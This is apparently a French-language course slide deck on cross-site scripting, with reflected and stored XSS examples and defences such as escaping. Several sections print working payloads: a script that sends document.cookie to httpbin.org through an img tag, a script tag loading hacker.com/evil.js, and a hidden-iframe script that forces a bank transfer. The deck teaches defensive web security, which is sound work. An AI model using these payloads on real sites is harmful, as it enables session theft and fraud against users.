---
layout: lesson
title: XSS
subtitle: Cross Site Scripting
scripts: ../assets/js/mock-browser.js
addons:
  video:
    url: https://sourcesup.renater.fr/aws-media/xss.webm
    quizzes:
      - 58a4d0ff6e24fc1857e2915c
---

<style>
.cli  { box-shadow: 0 0 2px 2px blue; }
.srv { box-shadow: 0 0 2px 2px yellow; }
.att    { box-shadow: 0 0 2px 2px red; }
</style>

<section>

## Ne jamais se fier au client

Toutes les données en provenance du client :

- Entêtes HTTP,
- Paramètres de l'URL, *query string*
- Corps de la requête, données des formulaires,
- Cookies, Storage API,

peuvent contenir des valeurs **non valides**. Dans les attaques de
type XSS :

- **Le client est la victime**, pas le serveur.
- Les données non-valides sont construites par l'attaquant.
- La victime est **persuadée/forcée par l'attaquant** à rentrer les
  données non-valides dans l'application.
- Les données non-valides sont **retournées à la victime par le
  serveur**, avec des effets non désirés.
  
</section>
<section>

## Injection de code HTML

Dans la suite

> Clélie est le client, victime des attaques.
{:.cli}

> Servane est le serveur, contenant une faille XSS.
{:.srv}

> Athanase est l'attaquant, qui cible Clélie.
{:.att}

Pour démontrer une faille XSS, on se contente en général de démontrer
la possibilité d'exécuter du code JavaScript arbitraire, hors du
contrôle du <span class="srv">serveur</span> : afficher un popup
suffit !

</section>
<section>

## Exemple

<span class="srv">Servane</span> utilise une valeur provenant du
*query string*, sans filtrer :

~~~
return 'Bonjour ' + $req->query->get('user');
~~~
{:.srv}

> Clélie a l'habitude de visiter
> <http://servane.org/?user=Clélie>{:.mock-jump data-target="xss-simple-demo"}
{:.cli}

<div id="xss-simple-demo" class="mock-browser cli content" data-callback="xssSimpleDemo"
	data-sandbox="allow-popups allow-modals allow-scripts"></div>
<script>
function xssSimpleDemo(addr) {
	return '../assets/xss.html?' + addr.split('user=')[1];
}
</script>

<span class="att">Athanase</span> persuade Clélie de visiter une URL
spécialement conçue :

> Salut Clélie, j'ai trouvé une vidéo trop marante chez Servane :
>
> <http://servane.org/?user=&lt;script&gt;alert('XSS reussi !')&lt;/script&gt;>{:.mock-jump data-target="xss-simple-demo"}
{:.att}

</section>
<section>

## Se protéger de XSS

Échapper les caractères spéciaux : `<`,  `>`,  `&`, `"`, `'`, ...

- Avec la fonction `htmlspecialchars()` de PHP,
- Avec la fonction `$app->escape()` de Silex,
- Par l'échappement automatique de Twig, ou d'un autre moteur de
  templates (voir aussi la
  [leçon sur les templates](templates#chappement)).

<div class="mock-browser cli content" data-callback="escape"
	data-src="http://servane.org/?user=<b>Cl%C3%A9lie</b>"
	data-sandbox="allow-popups allow-modals allow-scripts"></div>
<script>
function escape(addr) {
	return '../assets/xss.html?' + addr.split('user=')[1] + "#escape";
}
</script>

</section>
<section>

# Attaques XSS

</section>
<section>

## Cross site scripting

On estime que 80% des failles de sécurité des application web sont des
failles XSS.

#### Que peut-on faire avec XSS ?

- Changer l'apparence d'une page, la défigurer (recerchez
  [Stallowned](http://www.google.com/search?q=stallowned)).
- Rédiriger et *phisher*.
- Vols des cookies et des données privées !
- Propager l'exploit XSS comme un ver.
- **Controler le browser de la victime !!!**

Les attaques XSS comportent trois acteurs : le <span
class="cli">client (la victime)</span>, <span
class="att">l'attaquant</span> et <span class="srv">le serveur</span>.

Elles nécessitent d'une part de *social engineering*.

</section>
<section class="compact">

## XSS permanent et reflété

**XSS reflété :** Le code est injecté quand le client visite le lien

- Query string
- Formulaires
- Résultats de recherche

~~~
From: "order-update@amazon.com" <order-update@amazon.com>
Subject: Amazon.com - Your Cancellation (175-2364376-728612)

<html><body>
Your order has been successfully canceled. For your reference,
here's a summary of your order:<br />

You just canceled order <a
href="http://www.amazon.com/?var=<script>injection()</script>">#175-2364376-728612</a>
placed on February 16, 2012. ...
~~~
{:.att}

**XSS permanent :** Le code est stocké sur le server (typiquement,
  dans la BD)

- Billets de blog, forums, ...
- Réseaux sociaux.

</section>
<section>

## Palliatif : Cross-domain policy

> À aucun moment un script d'un domaine (par
> ex. `www.hacker.com`{:.att}) doit pouvoir accéder à partir d'un
> document au contenu d'un domaine diffèrent (par ex.
> `www.example.com`{:.srv}).


### La cross-domain policy est mise en place pour

- Cookies ;
- Requêtes AJAX ;
- Contenu de frames et iframes.

### Exceptions (nécessaires)

- Images, audio, vidéos ;
- Scripts ;
- URL des frames et iframes.

</section>
<section>

## Exemple : vol de session

1. L'attaquant dispose de domaines qu'il contrôle, par exemple :
   
   - `http://cdn.rawgit.com/`,
   - `http://httpbin.org/`.
   {:.att}
   
   Il sert un script à l'adresse <http://cdn.rawgit.com/defeo/aws-security/master/xss.js>
   
   ~~~
   document.body.innerHTML +=
     '<img src="http://httpbin.org/get?ck=' + document.cookie + '">';
   ~~~
   {:.att}

**Note :** ce script est complètement inoffensif si servi par
Athanase : 

<div class="mock-browser cli content" data-callback="storedXSS1"
	data-src="http://cdn.rawgit.com/defeo/aws-security/master/xss.html">
</div>
<script>
sessionStorage[window.location.host + '.sessid'] = Math.random().toString().substr(2);
var storedXSS1Count = 0;
function storedXSS1(addr) {
	return (storedXSS1Count++ &&
		addr.match('^http://cdn.rawgit.com/defeo/aws-security/master/[^/]+$')) ? addr : null;
}
</script>

</section>
<section id="stored-xss-2">

## Exemple : vol de session

2. <span class="srv">Servane</span> a une *faille XSS permanente* dans
   son blog : les commentaires peuvent être injectés avec des balises
   `<script>`.

3. <span class="att">Athanase</span> injecte le code suivant dans
   `http://blog.servane.org/`{:.srv}
   
   ~~~
   <script src="http://cdn.rawgit.com/defeo/aws-security/master/xss.js"></script>
   ~~~
   {:.compact}

4. <span class="cli">Clélie</span> visite le blog de Servane. Le
   script de Athanase s'exécute, et envoie les cookies de Clélie (y
   compris **son identifiant de session**) à
   `http://httpbin.org`{:.att}.
{: start="2"}


<div class="mock-browser cli content" data-callback="storedXSS2" data-height="200px"
	data-src="http://blog.servane.org/">
</div>
<script>
sessionStorage[window.location.host + '.sessid'] = Math.random().toString().substr(2);
var storedXSS2Count = 0;
function storedXSS2(addr) {
	return storedXSS2Count++ ? "../assets/permanent-xss.html" : null;
}
</script>

</section>
<section>

## Pourquoi `<img>` ?

La balise `<img>` est utilisée souvent pour envoyer des données de la
victime à l'attaquant :

~~~
<img src='http://httpbin.org/get?ck={"sessid":"a10340f0e"}' />
~~~
{:.compact}

- Presque tous les browsers savent la gérer,
- Connexion silencieuse (pas d'interaction utilisateur, pas de confirmation),
- Rarement filtrée,
- Idéale pour une transmission **de la victime à l'attaquant**.

Autres techniques pour capter les données :

- `XMLHttpRequest`,
- iframes,
- formulaires cachés,
- `<audio>`, `<video>`, ...
- ...

</section>
<section>

## Autre exemple : abus d'identité

- <span class="att">L'attaquant</span> injecte le script dans une page
  vulnérable et le donne à la <span class="cli">victime</span>

~~~
http://bank.servane.org/?<script src="http://hacker.com/evil.js"></script>
~~~
{:.srv}

- Le script ajoute un `<iframe>` caché dans la page du <span
  class="srv">serveur</span>

~~~
document.write('<iframe name="hf" style="display:none"></iframe>');
~~~
{:.att}

- Après quelques secondes, le script génère une requête à une page
  sécurisée

~~~
function req() {
  window.frames.hf.location.href=
    'http://bank.servane.org/transfer?to=athanase&amount=10000';
}
setTimeout(req, 5000);
~~~
{:.javascript.att}

- La réponse à `transfer` est reçue dans l'iframe. <span
  class="cli">Clélie</span> ne s'est aperçue de rien.

</section>
<section>

## Lectures

- Un tutoriel : <http://excess-xss.com/>,
- Un autre
  [tutoriel par Google](http://www.google.com/about/appsecurity/learning/xss/),
- Code source des exemples : <https://github.com/defeo/aws-security>.
- The tangled web: <http://lcamtuf.coredump.cx/tangled/>,

## Outils

- Proxy HTTP : [WireShark](https://www.wireshark.org/),
- Proxy HTTP : [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) (OWASP),
- Tests de pénetration : [Burp Scanner](http://portswigger.net/burp/scanner.html) (OWASP),
- Plateforme d'entraînement :
  [WebGoat](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project)
  (OWASP).


</section>
